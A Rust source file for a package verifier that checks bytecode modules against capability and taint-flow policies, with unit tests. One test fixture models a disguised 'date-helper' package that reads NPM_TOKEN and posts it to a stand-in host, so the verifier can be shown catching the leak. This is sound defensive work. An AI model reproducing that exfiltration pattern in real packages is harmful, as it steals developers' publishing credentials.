use std::collections::BTreeSet;
use std::error::Error;
use std::fmt;

use omc_cap::{Capability, Policy, Sink};
use omc_format::{BehaviorType, CapOp, Function, FunctionId, Module, Op};
use omc_taint::Label;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VerifyFinding {
    pub function: String,
    pub instruction: usize,
    pub message: String,
}

impl VerifyFinding {
    fn new(function: &Function, instruction: usize, message: impl Into<String>) -> Self {
        Self {
            function: function.name.clone(),
            instruction,
            message: message.into(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VerifyError {
    pub findings: Vec<VerifyFinding>,
}

impl fmt::Display for VerifyError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        for finding in &self.findings {
            writeln!(
                f,
                "{}[{}]: {}",
                finding.function, finding.instruction, finding.message
            )?;
        }
        Ok(())
    }
}

impl Error for VerifyError {}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VerificationReport {
    pub observed_capabilities: Vec<Capability>,
}

pub fn verify_module(module: &Module, policy: &Policy) -> Result<VerificationReport, VerifyError> {
    let function_ids = module
        .functions
        .iter()
        .map(|function| function.id)
        .collect::<BTreeSet<_>>();
    let mut findings = Vec::new();
    let mut observed_capabilities = Vec::new();

    for function in &module.functions {
        verify_function_shape(module, function, &function_ids, &mut findings);
        verify_function_policy(
            module,
            function,
            policy,
            &mut observed_capabilities,
            &mut findings,
        );
    }

    if findings.is_empty() {
        Ok(VerificationReport {
            observed_capabilities,
        })
    } else {
        Err(VerifyError { findings })
    }
}

fn verify_function_shape(
    _module: &Module,
    function: &Function,
    function_ids: &BTreeSet<FunctionId>,
    findings: &mut Vec<VerifyFinding>,
) {
    for (index, op) in function.code.iter().enumerate() {
        match op {
            Op::CallLocal(id) if !function_ids.contains(id) => findings.push(VerifyFinding::new(
                function,
                index,
                format!("call to unknown local function {id}"),
            )),
            Op::LoadLocal(id) | Op::StoreLocal(id) if *id >= function.locals => {
                findings.push(VerifyFinding::new(
                    function,
                    index,
                    format!("local {id} exceeds local count {}", function.locals),
                ))
            }
            _ => {}
        }
    }
}

fn verify_function_policy(
    module: &Module,
    function: &Function,
    policy: &Policy,
    observed_capabilities: &mut Vec<Capability>,
    findings: &mut Vec<VerifyFinding>,
) {
    let mut stack = Vec::<Label>::new();
    let mut locals = vec![Label::Public; function.locals as usize];

    for (index, op) in function.code.iter().enumerate() {
        match op {
            Op::Const(_) | Op::LoadArg(_) => stack.push(Label::Public),
            Op::LoadLocal(id) => stack.push(locals[*id as usize].clone()),
            Op::StoreLocal(id) => match stack.pop() {
                Some(label) => locals[*id as usize] = label,
                None => findings.push(VerifyFinding::new(function, index, "stack underflow")),
            },
            Op::Add | Op::Sub | Op::Eq => {
                pop_binary(function, index, &mut stack, findings);
            }
            Op::Slice => {
                pop_ternary(function, index, &mut stack, findings);
            }
            Op::Len | Op::JsonParse | Op::JsonStringify => match stack.pop() {
                Some(label) => stack.push(label),
                None => findings.push(VerifyFinding::new(function, index, "stack underflow")),
            },
            Op::CallLocal(_) | Op::CallImport(_) => stack.push(Label::Public),
            Op::Cap(cap) => {
                let observed = Capability::for_cap_op(cap);
                observed_capabilities.push(observed.clone());

                if module.declared_behavior == BehaviorType::Pure {
                    findings.push(VerifyFinding::new(
                        function,
                        index,
                        format!("pure package contains capability instruction {observed}"),
                    ));
                }

                if let Err(error) = policy.require(observed) {
                    findings.push(VerifyFinding::new(function, index, error.message));
                }

                simulate_cap_flow(function, index, cap, policy, &mut stack, findings);
            }
            Op::Return => {}
            Op::Trap(_) => {}
        }
    }
}

fn simulate_cap_flow(
    function: &Function,
    index: usize,
    cap: &CapOp,
    policy: &Policy,
    stack: &mut Vec<Label>,
    findings: &mut Vec<VerifyFinding>,
) {
    match cap {
        CapOp::EnvRead { name } => stack.push(Label::Env(name.clone())),
        CapOp::FsRead { path } => stack.push(Label::File(path.to_string())),
        CapOp::FsWrite {
            path,
            value_from_stack,
        } => {
            let label = pop_optional_body(function, index, *value_from_stack, stack, findings);
            check_flow(
                function,
                index,
                policy,
                label,
                Sink::File(path.to_string()),
                findings,
            );
            stack.push(Label::Public);
        }
        CapOp::HttpRequest { request } => {
            let label =
                pop_optional_body(function, index, request.body_from_stack, stack, findings);
            check_flow(
                function,
                index,
                policy,
                label,
                Sink::Network(request.host.clone()),
                findings,
            );
            stack.push(Label::Network(request.host.clone()));
        }
        CapOp::DnsLookup { host } => stack.push(Label::Network(host.clone())),
        CapOp::TimeNow | CapOp::RandomBytes { .. } => stack.push(Label::Public),
        CapOp::ProcSpawn { command, .. } => {
            check_flow(
                function,
                index,
                policy,
                Label::Public,
                Sink::Process(command.clone()),
                findings,
            );
        }
        CapOp::DynamicEval { source_from_stack } => {
            let label = pop_optional_body(function, index, *source_from_stack, stack, findings);
            check_flow(function, index, policy, label, Sink::Eval, findings);
            stack.push(Label::Public);
        }
    }
}

fn pop_binary(
    function: &Function,
    index: usize,
    stack: &mut Vec<Label>,
    findings: &mut Vec<VerifyFinding>,
) {
    let right = stack.pop();
    let left = stack.pop();
    match (left, right) {
        (Some(left), Some(right)) => stack.push(left.join(right)),
        _ => findings.push(VerifyFinding::new(function, index, "stack underflow")),
    }
}

fn pop_ternary(
    function: &Function,
    index: usize,
    stack: &mut Vec<Label>,
    findings: &mut Vec<VerifyFinding>,
) {
    let third = stack.pop();
    let second = stack.pop();
    let first = stack.pop();
    match (first, second, third) {
        (Some(first), Some(second), Some(third)) => stack.push(first.join(second).join(third)),
        _ => findings.push(VerifyFinding::new(function, index, "stack underflow")),
    }
}

fn pop_optional_body(
    function: &Function,
    index: usize,
    required: bool,
    stack: &mut Vec<Label>,
    findings: &mut Vec<VerifyFinding>,
) -> Label {
    if !required {
        return Label::Public;
    }

    match stack.pop() {
        Some(label) => label,
        None => {
            findings.push(VerifyFinding::new(function, index, "stack underflow"));
            Label::Public
        }
    }
}

fn check_flow(
    function: &Function,
    index: usize,
    policy: &Policy,
    label: Label,
    sink: Sink,
    findings: &mut Vec<VerifyFinding>,
) {
    if let Err(error) = policy.check_flows(&label, sink) {
        findings.push(VerifyFinding::new(function, index, error.message));
    }
}

pub fn harmless_slugify_module() -> Module {
    Module {
        id: "npm:slugify-lite@1.0.0".to_owned(),
        package: "slugify-lite".to_owned(),
        version: "1.0.0".to_owned(),
        declared_behavior: BehaviorType::Pure,
        functions: vec![Function::new(
            0,
            "slugify",
            1,
            vec![Op::LoadArg(0), Op::Return],
        )],
    }
}

pub fn malicious_date_helper_module() -> Module {
    Module {
        id: "npm:date-helper@1.2.4".to_owned(),
        package: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        declared_behavior: BehaviorType::HostCapability,
        functions: vec![Function::new(
            0,
            "formatDate",
            1,
            vec![
                Op::Cap(CapOp::EnvRead {
                    name: "NPM_TOKEN".to_owned(),
                }),
                Op::Cap(CapOp::HttpRequest {
                    request: omc_format::HttpRequest::post(
                        "https://cdn-update-service.example/a",
                        "cdn-update-service.example",
                    ),
                }),
                Op::LoadArg(0),
                Op::Return,
            ],
        )],
    }
}

#[cfg(test)]
mod tests {
    use omc_cap::{Capability, LabelMatcher, Policy, Sink};

    use super::*;

    #[test]
    fn accepts_pure_module_without_capabilities() {
        let report = verify_module(&harmless_slugify_module(), &Policy::pure()).unwrap();
        assert!(report.observed_capabilities.is_empty());
    }

    #[test]
    fn accepts_slice_with_three_stack_operands() {
        let module = Module {
            id: "test:slice".to_owned(),
            package: "slice".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "slice",
                1,
                vec![
                    Op::LoadArg(0),
                    Op::Const(omc_format::Value::Int(0)),
                    Op::Const(omc_format::Value::Int(3)),
                    Op::Slice,
                    Op::Return,
                ],
            )],
        };

        verify_module(&module, &Policy::pure()).unwrap();
    }

    #[test]
    fn rejects_slice_with_missing_stack_operands() {
        let module = Module {
            id: "test:bad-slice".to_owned(),
            package: "bad-slice".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "slice",
                0,
                vec![Op::Const(omc_format::Value::Int(0)), Op::Slice, Op::Return],
            )],
        };

        let err = verify_module(&module, &Policy::pure()).unwrap_err();
        assert!(err
            .findings
            .iter()
            .any(|finding| finding.message == "stack underflow"));
    }

    #[test]
    fn accepts_json_ops_with_one_stack_operand() {
        let module = Module {
            id: "test:json".to_owned(),
            package: "json".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "json",
                1,
                vec![Op::LoadArg(0), Op::JsonParse, Op::JsonStringify, Op::Return],
            )],
        };

        verify_module(&module, &Policy::pure()).unwrap();
    }

    #[test]
    fn rejects_secret_flow_even_when_capabilities_are_granted() {
        let module = malicious_date_helper_module();
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost(
                "cdn-update-service.example".to_owned(),
            ));

        let err = verify_module(&module, &policy).unwrap_err();
        assert!(err
            .findings
            .iter()
            .any(|finding| finding.message.contains("env:NPM_TOKEN may not flow")));
    }

    #[test]
    fn accepts_explicit_secret_flow_to_approved_host() {
        let module = malicious_date_helper_module();
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost(
                "cdn-update-service.example".to_owned(),
            ))
            .allow_flow(
                LabelMatcher::Env("NPM_TOKEN".to_owned()),
                Sink::Network("cdn-update-service.example".to_owned()),
            );

        verify_module(&module, &policy).unwrap();
    }

    #[test]
    fn accepts_secret_flow_when_all_flows_are_explicitly_allowed() {
        let module = malicious_date_helper_module();
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost(
                "cdn-update-service.example".to_owned(),
            ))
            .allow_all_flows();

        verify_module(&module, &policy).unwrap();
    }
}
